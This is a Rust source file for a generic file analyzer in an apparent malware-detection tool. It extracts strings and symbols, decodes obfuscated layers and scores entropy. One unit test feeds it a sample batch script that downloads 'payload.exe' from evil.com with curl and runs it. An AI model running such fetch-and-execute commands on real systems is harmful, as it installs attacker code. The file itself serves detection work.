//! Generic source code analyzer.
//!
//! Fallback analyzer for file types without dedicated analyzers.
//! Uses tree-sitter for symbol extraction where available, otherwise
//! falls back to basic text/regex-based analysis.

use crate::analyzers::symbol_extraction;
use crate::analyzers::FileType;
use crate::analyzers::{AnalysisInput, Analyzer};
use crate::capabilities::CapabilityMapper;
use crate::types::{AnalysisReport, StringInfo, TargetInfo};
use anyhow::Result;
use std::path::Path;
use std::sync::Arc;
use tree_sitter::Language;

/// Generic analyzer that works with any text file.
///
/// For languages with tree-sitter support, extracts symbols via AST.
/// For all files, extracts strings and runs trait matching.
#[derive(Debug)]
pub(crate) struct GenericAnalyzer {
    file_type: FileType,
    capability_mapper: Arc<CapabilityMapper>,
}

impl GenericAnalyzer {
    /// Create a new generic analyzer for the given file type
    #[must_use]
    pub(crate) fn new(file_type: FileType) -> Self {
        Self {
            file_type,
            capability_mapper: Arc::new(CapabilityMapper::empty()),
        }
    }

    /// Create analyzer with pre-existing capability mapper (wraps in Arc)
    #[must_use]
    pub(crate) fn with_capability_mapper(mut self, mapper: CapabilityMapper) -> Self {
        self.capability_mapper = Arc::new(mapper);
        self
    }

    /// Create analyzer with shared capability mapper (avoids cloning)
    #[must_use]
    pub(crate) fn with_capability_mapper_arc(mut self, mapper: Arc<CapabilityMapper>) -> Self {
        self.capability_mapper = mapper;
        self
    }

    /// Get tree-sitter language and call node types for this file type, if available.
    fn treesitter_config(&self) -> Option<(Language, &'static [&'static str])> {
        match self.file_type {
            FileType::Swift => Some((tree_sitter_swift::LANGUAGE.into(), &["call_expression"])),
            FileType::ObjectiveC => Some((
                tree_sitter_objc::LANGUAGE.into(),
                &["message_expression", "call_expression"],
            )),
            FileType::Groovy => Some((
                tree_sitter_groovy::LANGUAGE.into(),
                &["method_call", "function_call"],
            )),
            FileType::Scala => Some((
                tree_sitter_scala::LANGUAGE.into(),
                &["call_expression", "method_call"],
            )),
            FileType::Zig => Some((tree_sitter_zig::LANGUAGE.into(), &["call_expression"])),
            FileType::Elixir => Some((tree_sitter_elixir::LANGUAGE.into(), &["call"])),
            // No tree-sitter for these; also fallback for dedicated analyzer types
            _ => None,
        }
    }

    fn file_type_str(&self) -> &'static str {
        match self.file_type {
            FileType::C => "c",
            FileType::Swift => "swift",
            FileType::ObjectiveC => "objc",
            FileType::Groovy => "groovy",
            FileType::Scala => "scala",
            FileType::Zig => "zig",
            FileType::Elixir => "elixir",
            FileType::Batch => "batch",
            FileType::Vbs => "vbs",
            FileType::GithubActions => "github-actions",
            FileType::SystemdService => "systemd",
            FileType::DesktopEntry => "desktop-entry",
            FileType::Xml => "xml",
            FileType::PkgInfo => "pkg-info",
            FileType::CargoToml => "cargo.toml",
            FileType::PyProjectToml => "pyproject.toml",
            FileType::PackageLockJson => "package-lock.json",
            FileType::Plist => "plist",
            FileType::Html => "html",
            FileType::Markdown => "markdown",
            FileType::Makefile => "makefile",
            FileType::Text => "text",
            FileType::Data => "data",
            FileType::Pdf => "pdf",
            FileType::PythonBytecode => "python-bytecode",
            FileType::Lnk => "lnk",
            _ => "unknown",
        }
    }

    #[allow(dead_code)] // Used by embedded_code_detector
    fn analyze_source(&self, file_path: &Path, content: &str) -> AnalysisReport {
        self.analyze_source_internal(file_path, content, None, None, None)
    }

    fn analyze_source_internal(
        &self,
        file_path: &Path,
        content: &str,
        stng_strings: Option<&[stng::ExtractedString]>,
        original_bytes: Option<&[u8]>,
        precomputed_sha256: Option<String>,
    ) -> AnalysisReport {
        let start = std::time::Instant::now();
        tracing::debug!(
            "GenericAnalyzer: Starting analysis of {}",
            file_path.display()
        );

        // Use original bytes for hash/size if available, otherwise fall back to content
        // This fixes incorrect hash/size when analyzing binary files as text
        let (size_bytes, sha256) = if let Some(bytes) = original_bytes {
            (
                bytes.len() as u64,
                precomputed_sha256
                    .unwrap_or_else(|| crate::analyzers::utils::calculate_sha256(bytes)),
            )
        } else {
            (
                content.len() as u64,
                precomputed_sha256.unwrap_or_else(|| {
                    crate::analyzers::utils::calculate_sha256(content.as_bytes())
                }),
            )
        };

        let target = TargetInfo {
            path: file_path.display().to_string(),
            file_type: self.file_type_str().to_string(),
            size_bytes,
            sha256,
            architectures: None,
        };
        tracing::debug!("GenericAnalyzer: Target created in {:?}", start.elapsed());

        let mut report = AnalysisReport::new(target);

        // `pyc.*` kv comes from filefacts's dual emission in the
        // capability mapper — no synthesis needed here.

        // Add structural feature
        let (parser_name, description) = if let Some((_, _)) = self.treesitter_config() {
            (
                format!("tree-sitter-{}", self.file_type_str()),
                format!("{} source code", self.file_type_str()),
            )
        } else {
            (
                "text-analysis".to_string(),
                format!("{} file (text analysis)", self.file_type_str()),
            )
        };

        report
            .structure
            .push(crate::analyzers::utils::create_language_feature(
                self.file_type_str(),
                &parser_name,
                &description,
            ));

        // Parse with tree-sitter ONCE (don't parse multiple times for the same content)
        let t_tree = std::time::Instant::now();
        let tree = if let Some((language, node_types)) = self.treesitter_config() {
            // Parse once and reuse for symbols, imports, and strings
            let mut parser = tree_sitter::Parser::new();
            if parser.set_language(&language).is_ok() {
                if let Some(tree) = parser.parse(content, None) {
                    // Extract function calls for capability matching (type: symbol conditions)
                    symbol_extraction::extract_symbols_from_tree(
                        &tree,
                        content,
                        node_types,
                        &mut report,
                    );
                    // Also extract actual module imports for metadata/import/ findings
                    symbol_extraction::extract_imports_from_tree(
                        &tree,
                        content,
                        &self.file_type,
                        &mut report,
                    );
                    Some(tree)
                } else {
                    None
                }
            } else {
                None
            }
        } else {
            None
        };
        tracing::debug!(
            "GenericAnalyzer: Tree-sitter parsing completed in {:?}",
            t_tree.elapsed()
        );

        let allow_unknown_binary_strings = self.file_type == FileType::Unknown
            && Path::new(&file_path)
                .extension()
                .is_some_and(|ext| ext.eq_ignore_ascii_case("com"))
            && content.len() <= 4096;

        if self.file_type == FileType::Unknown && !allow_unknown_binary_strings {
            tracing::debug!(
                "GenericAnalyzer: Skipping full string extraction and embedded code analysis for unknown file"
            );
        } else {
            // Extract strings (AST-based if we have a tree, stng-based otherwise)
            let t_strings = std::time::Instant::now();
            if tree.is_some() {
                // Tree-sitter available: use AST-based extraction (more accurate)
                self.extract_strings(content, tree.as_ref(), &mut report);
                tracing::debug!(
                    "GenericAnalyzer: Tree-sitter string extraction completed in {:?}",
                    t_strings.elapsed()
                );
            } else if let Some(stng_results) = stng_strings {
                // No tree-sitter: use stng results (passed from caller)
                for es in stng_results {
                    // Convert stng fragments to our format (just record offsets, we don't need to reconstruct values)
                    let fragments = es.fragments.as_ref().map(|frags| {
                        frags
                            .iter()
                            .map(|f| format!("{:#x}+{}", f.offset, f.length))
                            .collect()
                    });

                    // Preserve stng's decoded-string encoding so `type: encoded,
                    // encoding: xor` rules can match XOR/base64/hex/etc. content.
                    let encoding_chain = match es.method {
                        stng::StringMethod::XorDecode | stng::StringMethod::XorStackPair => {
                            vec!["xor".to_string()]
                        }
                        stng::StringMethod::Base64Decode => vec!["base64".to_string()],
                        stng::StringMethod::Base64ObfuscatedDecode => {
                            vec!["base64-obf".to_string()]
                        }
                        stng::StringMethod::HexDecode => vec!["hex".to_string()],
                        stng::StringMethod::UrlDecode => vec!["url".to_string()],
                        stng::StringMethod::UnicodeEscapeDecode => {
                            vec!["unicode-escape".to_string()]
                        }
                        stng::StringMethod::Base32Decode => vec!["base32".to_string()],
                        stng::StringMethod::Base85Decode => vec!["base85".to_string()],
                        stng::StringMethod::ScriptDecode => vec!["script".to_string()],
                        _ => Vec::new(),
                    };

                    report.strings.push(crate::types::binary::StringInfo {
                        value: es.value.clone(),
                        offset: Some(es.data_offset),
                        string_type: es.kind,
                        encoding: "utf-8".to_string(),
                        section: es.section.clone(),
                        encoding_chain,
                        fragments,
                    });
                }
                tracing::debug!(
                    "GenericAnalyzer: Used {} stng strings in {:?}",
                    stng_results.len(),
                    t_strings.elapsed()
                );
            } else {
                // No tree-sitter and no stng: fallback to regex (inefficient, shouldn't happen)
                self.extract_strings(content, tree.as_ref(), &mut report);
                tracing::warn!("GenericAnalyzer: Fallback regex string extraction in {:?} (stng strings should be passed)", t_strings.elapsed());
            }

            // Analyze embedded code in strings
            let t_embedded = std::time::Instant::now();
            let (encoded_layers, plain_findings) =
                crate::analyzers::embedded_code_detector::process_all_strings(
                    &file_path.display().to_string(),
                    &report.strings,
                    &self.capability_mapper,
                    0,
                    None,
                    None,
                );
            report.files.extend(encoded_layers);
            report.findings.extend(plain_findings);
            tracing::debug!(
                "GenericAnalyzer: Embedded code analysis completed in {:?}",
                t_embedded.elapsed()
            );
        }

        // Analyze paths and environment variables
        let t_paths = std::time::Instant::now();
        crate::path_mapper::analyze_and_link_paths(&mut report);
        crate::env_mapper::analyze_and_link_env_vars(&mut report);
        tracing::debug!(
            "GenericAnalyzer: Path/env analysis completed in {:?}",
            t_paths.elapsed()
        );

        // Compute basic metrics
        let t_metrics = std::time::Instant::now();
        self.compute_metrics(content, original_bytes, &mut report);
        tracing::debug!(
            "GenericAnalyzer: Metrics computed in {:?}",
            t_metrics.elapsed()
        );

        // Evaluate all rules (atomic + composite) and merge into report.
        //
        // Use the original binary bytes (`original_bytes`) rather than
        // `content.as_bytes()` — the latter is the UTF-8-lossy view, which
        // for binary inputs (LNK / pyc / RPM / etc. routed through this
        // analyzer) replaces every non-UTF-8 byte with U+FFFD (3 bytes
        // `EF BF BD`) and shifts every offset, corrupting filefacts's
        // header reads and any other byte-precise probe.
        let t_eval = std::time::Instant::now();
        let eval_bytes = original_bytes.unwrap_or(content.as_bytes());
        self.capability_mapper.evaluate_and_merge_findings(
            &mut report,
            eval_bytes,
            tree.as_ref(),
            None,
        );
        tracing::debug!(
            "GenericAnalyzer: Rule evaluation completed in {:?}",
            t_eval.elapsed()
        );

        report.metadata.analysis_duration_ms = start.elapsed().as_millis() as u64;
        report.metadata.tools_used = vec![parser_name];

        report
    }

    fn extract_strings(
        &self,
        content: &str,
        tree: Option<&tree_sitter::Tree>,
        report: &mut AnalysisReport,
    ) {
        if let Some(tree) = tree {
            // AST-based string extraction
            self.extract_strings_ast(&tree.root_node(), content.as_bytes(), report);
        } else {
            // Regex-based string extraction for files without tree-sitter
            self.extract_strings_regex(content, report);
        }
    }

    fn extract_strings_ast<'a>(
        &self,
        root: &tree_sitter::Node<'a>,
        source: &[u8],
        report: &mut AnalysisReport,
    ) {
        let mut cursor = root.walk();
        loop {
            let node = cursor.node();
            let kind = node.kind();

            // Common string node types across languages
            if kind.contains("string")
                || kind == "string_literal"
                || kind == "interpreted_string_literal"
                || kind == "raw_string_literal"
            {
                if let Ok(text) = node.utf8_text(source) {
                    let s = text
                        .trim_start_matches('"')
                        .trim_end_matches('"')
                        .trim_start_matches('\'')
                        .trim_end_matches('\'')
                        .trim_start_matches('`')
                        .trim_end_matches('`');
                    if !s.is_empty() && s.len() < 10000 {
                        report.strings.push(StringInfo {
                            value: s.to_string(),
                            offset: Some(node.start_byte() as u64),
                            string_type: None,
                            encoding: "utf-8".to_string(),
                            section: Some("ast".to_string()),
                            encoding_chain: Vec::new(),
                            fragments: None,
                        });
                    }
                }
            }

            if cursor.goto_first_child() {
                continue;
            }
            loop {
                if cursor.goto_next_sibling() {
                    break;
                }
                if !cursor.goto_parent() {
                    return;
                }
            }
        }
    }

    fn extract_strings_regex(&self, content: &str, report: &mut AnalysisReport) {
        fn double_quote_re() -> Option<&'static regex::Regex> {
            static RE: std::sync::OnceLock<Option<regex::Regex>> = std::sync::OnceLock::new();
            RE.get_or_init(|| regex::Regex::new(r#""([^"\\]|\\.){0,1000}""#).ok())
                .as_ref()
        }
        fn single_quote_re() -> Option<&'static regex::Regex> {
            static RE: std::sync::OnceLock<Option<regex::Regex>> = std::sync::OnceLock::new();
            RE.get_or_init(|| regex::Regex::new(r#"'([^'\\]|\\.){0,1000}'"#).ok())
                .as_ref()
        }

        if let Some(re) = double_quote_re() {
            for cap in re.find_iter(content) {
                let s = cap.as_str().trim_start_matches('"').trim_end_matches('"');
                if !s.is_empty() {
                    report.strings.push(StringInfo {
                        value: s.to_string(),
                        offset: Some(cap.start() as u64),
                        string_type: None,
                        encoding: "utf-8".to_string(),
                        section: Some("regex".to_string()),
                        encoding_chain: Vec::new(),
                        fragments: None,
                    });
                }
            }
        }

        if let Some(re) = single_quote_re() {
            for cap in re.find_iter(content) {
                let s = cap.as_str().trim_start_matches('\'').trim_end_matches('\'');
                if !s.is_empty() {
                    report.strings.push(StringInfo {
                        value: s.to_string(),
                        offset: Some(cap.start() as u64),
                        string_type: None,
                        encoding: "utf-8".to_string(),
                        section: Some("regex".to_string()),
                        encoding_chain: Vec::new(),
                        fragments: None,
                    });
                }
            }
        }
    }

    fn compute_metrics(
        &self,
        content: &str,
        original_bytes: Option<&[u8]>,
        report: &mut AnalysisReport,
    ) {
        // Pull `text.*` directly from filefacts. The capability mapper
        // also merges filefacts's metric map into `report.filefacts_metrics`
        // later, but `analyze_source_internal` may be called outside
        // that pipeline (tests, embedded-code re-entry), so do it
        // here too so generic-text files always carry the bytes view.
        let bytes = original_bytes.unwrap_or(content.as_bytes());
        if let Ok(parsed) = filefacts::open(bytes) {
            use crate::types::core::MetricsExt;
            let flat = report
                .filefacts_metrics
                .get_or_insert_with(Default::default);
            for (k, v) in parsed.metrics().iter() {
                if k.starts_with("text.") {
                    flat.set_f(k.to_string(), v);
                }
            }
        }
        if matches!(self.file_type, FileType::Data) {
            // Data files are opaque blobs; populate byte-level entropy so rules
            // can threshold on `binary.overall_entropy` to flag encrypted payloads.
            // Use the raw bytes when available — a lossy UTF-8 round trip collapses
            // non-printable bytes to U+FFFD and tanks the entropy score.
            let bytes = original_bytes.unwrap_or(content.as_bytes());
            use crate::types::core::MetricsExt;
            let flat = report
                .filefacts_metrics
                .get_or_insert_with(Default::default);
            flat.set_f(
                "binary.overall_entropy",
                crate::entropy::calculate_entropy(bytes),
            );
        }
    }
}

impl Analyzer for GenericAnalyzer {
    fn analyze_input(&self, input: &AnalysisInput<'_>) -> Result<AnalysisReport> {
        // Use data and strings from input (no file read, no string extraction)
        let content = String::from_utf8_lossy(input.data);
        Ok(self.analyze_source_internal(
            input.path,
            &content,
            Some(input.strings),
            Some(input.data),
            input.sha256.clone(),
        ))
    }

    fn can_analyze(&self, _file_path: &Path) -> bool {
        // Generic analyzer can attempt to analyze any file
        true
    }
}

#[cfg(test)]
#[allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]
mod tests {
    use super::*;
    use std::path::PathBuf;

    #[test]
    fn test_generic_batch_analysis() {
        let analyzer = GenericAnalyzer::new(FileType::Batch);
        let path = PathBuf::from("test.bat");
        let code = r#"
@echo off
set PATH="%PATH%;C:\malware"
curl "http://evil.com/payload.exe" -o "payload.exe"
start payload.exe
"#;
        let report = analyzer.analyze_source(&path, code);

        // Should extract strings (quoted strings are extracted)
        assert!(!report.strings.is_empty());
        // text.* metrics flow through filefacts_metrics now
        assert!(report
            .filefacts_metrics
            .as_ref()
            .is_some_and(|m| m.keys().any(|k| k.starts_with("text."))));
    }

    #[test]
    fn test_generic_swift_analysis() {
        let analyzer = GenericAnalyzer::new(FileType::Swift);
        let path = PathBuf::from("test.swift");
        let code = r#"
import Foundation
let url = URL(string: "http://example.com")!
let task = URLSession.shared.dataTask(with: url)
"#;
        let report = analyzer.analyze_source(&path, code);

        // Should have structural feature
        assert!(report.structure.iter().any(|s| s.id.contains("swift")));
        // Should extract strings
        assert!(!report.strings.is_empty());
    }

    #[test]
    fn test_generic_unknown_skips_embedded_detection() {
        let analyzer = GenericAnalyzer::new(FileType::Unknown);
        let path = PathBuf::from("README.zOS");
        let content = r#"
This is documentation.

test.c $(distdir)/runsuite.c | GZIP=$(GZIP_ENV) gzip -c >`echo "$(distdir)" | sh
"#;
        let report = analyzer.analyze_source(&path, content);

        assert!(report.strings.is_empty());
        assert!(!report
            .findings
            .iter()
            .any(|f| f.id == "metadata/lang/embedded::shell"));
    }

    #[test]
    fn test_generic_python_bytecode_reports_detected_type() {
        let analyzer = GenericAnalyzer::new(FileType::PythonBytecode);
        let input = AnalysisInput::new(
            std::path::Path::new("module.pyc"),
            &[0xCB, 0x0D, 0x0D, 0x0A, 0, 0, 0, 0],
            FileType::PythonBytecode,
        );

        let report = analyzer.analyze_input(&input).expect("analyze pyc");

        assert_eq!(report.target.file_type, "python-bytecode");
    }
}
